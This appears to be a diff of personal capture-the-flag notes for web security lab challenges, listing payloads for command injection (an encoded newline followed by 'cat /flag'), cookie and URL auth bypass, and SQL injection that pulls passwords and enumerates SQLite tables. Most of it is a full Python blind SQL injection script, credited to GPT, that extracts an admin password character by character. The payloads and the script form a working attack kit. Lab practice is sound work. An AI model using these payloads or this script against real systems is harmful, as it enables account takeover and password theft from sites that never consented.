@@ -1,4 +1,68 @@
 Web Sec
+
   CMDi 6
     %0A (encoded newline)
       %0A cat /flag
+
+  Auth Bypass 1
+    change url parameter to admin
+  Auth Bypass 2
+    change cookie header to admin
+
+  SQLi 1
+    inside pin 1 or "1"="1"
+  SQLi 2
+    in password ' or 1=1 -- 
+  SLQi 3
+    %" UNION SELECT password FROM users where username LIKE "admin
+    %" UNION SELECT password FROM "users
+    %" UNION SELECT password FROM users -- 
+  SQLi 4
+    It happened to be a sqlite not mysql based on error
+    %" UNION SELECT tbl_name from sqlite_master where type="table" --
+    %" UNION SELECT tbl_name from sqlite_master where type="table
+      -> %" UNION SELECT password from users_7374033324 --
+  SQLi 5
+    Blind SQL injection, needed to guess password for admin user as a flag. needed to write a script. thanks gpt
+import requests
+
+# Target URL and vulnerable parameter
+url = "http://challenge.localhost/"  # Replace with the target URL
+vulnerable_param = "password"
+target_username = "admin"
+
+# Character set to test for the password
+charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}.!@#$%^&*(){}|/<>,+_=-\\"
+password = ""
+
+# Define the boolean condition to check server response
+def is_correct_guess(char, index):
+    # SQLite uses SUBSTR for substring operations, starting index is 1
+    payload = f"' OR SUBSTR((SELECT password FROM users WHERE username='admin'), {index}, 1)='{char}' -- "
+    data = {"username": "admin", vulnerable_param: payload}  # Adjust parameters as needed
+    response = requests.post(url, data=data)
+    return "Hello" in response.text # Adjust based on the server's behavior
+
+# Iterate to build the password
+try:
+    print(f"Starting blind SQL injection for username '{target_username}'...")
+    index = 1
+    while True:
+        found = False
+        for char in charset:
+            print(f"Testing character '{char}' at position {index}...")
+            if is_correct_guess(char, index):
+                password += char
+                print(f"Character found: {char}")
+                found = True
+                break
+        if not found:
+            print("Password fully extracted.")
+            break
+        index += 1
+except KeyboardInterrupt:
+    print("\nProcess interrupted.")
+except Exception as e:
+    print(f"An error occurred: {e}")
+
+print(f"Extracted password: {password}")
